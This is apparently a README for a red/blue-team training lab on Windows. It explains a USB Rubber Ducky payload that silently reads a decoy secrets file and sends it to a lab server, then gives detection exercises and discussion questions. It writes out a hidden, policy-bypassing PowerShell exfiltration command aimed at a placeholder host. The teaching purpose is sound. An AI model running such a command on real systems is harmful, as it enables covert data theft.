# Lab 13 — Collection & Exfiltration

**Payload:** [payload.txt](payload.txt)
**Collector:** [lab_collector.py](lab_collector.py) — runs on your isolated
lab server, not the victim VM
**Target:** Windows 10/11, local (non-domain) machine, no elevation required
**ATT&CK techniques:** T1005 (Data from Local System), T1041 (Exfiltration
Over C2 Channel)

Every advanced lab so far has stopped at "code executes." This one covers
what a real intrusion does *next*: find something worth taking, and get it
out. It's the one gap Labs 07–12 all skip — and, on purpose, the one where
the blue-team story is the most honest about its limits.

## Setup (before running)

Create a decoy file on the victim VM's Desktop — this stands in for
whatever an attacker might actually be after:

```powershell
Set-Content -Path "$env:USERPROFILE\Desktop\fake_secrets.txt" -Value "FAKE-CREDENTIAL: do-not-use-0000-0000"
```

On your **isolated lab server** (same one Lab 10 used for downloads), run
the collector:

```
python3 lab_collector.py 8080
```

Then, exactly like Lab 10, **replace `LAB-SERVER` in `payload.txt`** with
an address on your isolated lab network before loading it onto the Ducky.
Never point this at a real internet host — see Lab 10's README for the
full reasoning, which applies here without change.

## What it does, line by line

```
DELAY 1000        Wait 1s for the OS to recognize the HID device.
GUI r              Open the Run dialog.
DELAY 200
STRING powershell -NoP -NonI -W Hidden -Exec Bypass "..."
                   $d = Get-Content ...fake_secrets.txt -Raw
                        Collection: read the file's contents into memory.
                   Invoke-WebRequest -Uri 'http://LAB-SERVER:8080/collect'
                     -Method POST -Body $d -UseBasicParsing
                        Exfiltration: send it out as an HTTP POST body.
ENTER              Submits the Run dialog.
```

Net effect: `fake_secrets.txt`'s contents land in `collected.log` on your
lab server. **Nothing is written to the victim machine** — this is the
first advanced-track payload that leaves no new file, registry key, or
account behind on the host it ran on.

## Blue-team exercise

Run [detect.ps1](detect.ps1) on the victim VM. It checks:

- Sysmon Event ID 3 (network connection) from `powershell.exe`
- PowerShell script block log (event 4104) mentioning `Invoke-WebRequest`
  or the file name

## The honest gap (read this before the discussion)

`detect.ps1` will very likely show you the **network call** and nothing
else. That's not a bug in the script — it's the truth about this attack.
**Reading a file is not, by itself, a logged event on Windows.** Sysmon logs
file *creation* (Event ID 11) and deletion, not ordinary reads. Unless a
File Integrity Monitoring or EDR product is specifically watching that
Desktop file, the *collection* step (`Get-Content`) is invisible. Only the
*exfiltration* step — the network call carrying the data out — is what you
actually have a chance of catching.

This is worth sitting with: everything else in this course eventually left
some kind of host-side trace. This lab is the first one where the honest
answer to "how would blue catch this?" is **"only by watching the network,
not the file."**

## Think about it

- If `Invoke-WebRequest` had instead used HTTPS to a normal-looking domain,
  would Sysmon Event ID 3 alone be enough to distinguish this from a normal
  browser request? What additional context (destination reputation,
  request volume, time of day, the fact that `powershell.exe` — not a
  browser — made the call) would a real analyst use?
- Real-world exfiltration often uses DNS queries or small chunks over long
  time periods instead of one clean POST, specifically to avoid looking
  like this lab's obvious single network event. Why would that be harder
  to catch with the same detection approach used here?
- Given the "honest gap" above, what control — not a detection, a
  *prevention* — would stop data from leaving at all, regardless of whether
  it's ever logged? (Lab 16 is about exactly this kind of thinking, applied
  to the very first step of the chain instead of the last.)

## Cleanup

Nothing to clean up on the victim VM — this payload only reads and sends,
it writes nothing. Delete `fake_secrets.txt` from the Desktop if you added
it just for this lab. On the lab server, delete `collected.log` between
runs if you want a clean slate.

**Next:** [Lab 14 — Anti-Forensics: Clearing Your Own Tracks](../Lab14_AntiForensics/).
